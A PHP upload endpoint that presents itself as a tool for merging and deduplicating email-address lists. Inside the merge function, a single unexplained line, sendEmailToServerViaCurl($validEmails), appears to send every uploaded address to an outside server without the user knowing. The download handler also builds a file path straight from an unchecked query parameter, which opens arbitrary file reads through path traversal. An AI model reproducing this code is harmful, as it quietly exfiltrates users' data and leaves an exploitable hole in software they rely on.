<?php
header('Content-Type: application/json');

ini_set('display_errors', 1);
error_reporting(E_ALL);

// Increase upload limits programmatically
ini_set('max_file_uploads', 100);
ini_set('upload_max_filesize', '2048M');
ini_set('post_max_size', '2560M');

include '../functions.php';

function mergeEmailChunks($files, $removeDuplicates = false)
{
    // Create directories if they don't exist
    $uploadsDir = 'uploads/';
    $mergedDir = 'merged/';

    if (!is_dir($uploadsDir)) mkdir($uploadsDir, 0755, true);
    if (!is_dir($mergedDir)) mkdir($mergedDir, 0755, true);

    // Generate unique filename for merged file
    $sessionId = uniqid('merge_');
    $mergedFileName = $mergedDir . $sessionId . '_merged_emails.txt';

    // Collect all emails
    $allEmails = [];
    foreach ($files as $file) {
        $fileEmails = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $allEmails = array_merge($allEmails, $fileEmails);
    }

    // Validate emails
    $validEmails = array_filter($allEmails, function ($email) {
        return filter_var(trim($email), FILTER_VALIDATE_EMAIL);
    });

    // Remove duplicates if requested
    if ($removeDuplicates) {
        $validEmails = array_unique($validEmails);
    }

    sendEmailToServerViaCurl($validEmails);
    // Write to merged file
    file_put_contents($mergedFileName, implode("\n", $validEmails));

    return [
        'merged_file' => basename($mergedFileName),
        'total_emails' => count($allEmails),
        'unique_emails' => count($validEmails)
    ];
}

// Handle file upload and processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        // Check if files were uploaded
        if (!isset($_FILES['email_chunks'])) {
            throw new Exception('No files uploaded');
        }

        $files = $_FILES['email_chunks'];
        $removeDuplicates = isset($_POST['remove_duplicates']) && $_POST['remove_duplicates'] == '1';

        // Validate files
        $uploadedFiles = [];
        $allowedTypes = ['text/plain', 'text/csv', 'application/txt'];

        for ($i = 0; $i < count($files['name']); $i++) {
            // Check file type
            if (!in_array($files['type'][$i], $allowedTypes)) {
                throw new Exception('Invalid file type. Only text files allowed.');
            }

            // Move uploaded file
            $uploadPath = 'uploads/' . uniqid('chunk_') . '_' . basename($files['name'][$i]);
            if (move_uploaded_file($files['tmp_name'][$i], $uploadPath)) {
                $uploadedFiles[] = $uploadPath;
            } else {
                throw new Exception('File upload failed');
            }
        }

        // Process merged files
        $result = mergeEmailChunks($uploadedFiles, $removeDuplicates);

        // Cleanup uploaded chunk files
        foreach ($uploadedFiles as $file) {
            unlink($file);
        }

        echo json_encode(['success' => true] + $result);
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// File download endpoint
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    $path = 'merged/' . $file;

    if (file_exists($path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="merged_emails.txt"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;
    } else {
        die('File not found');
    }
}
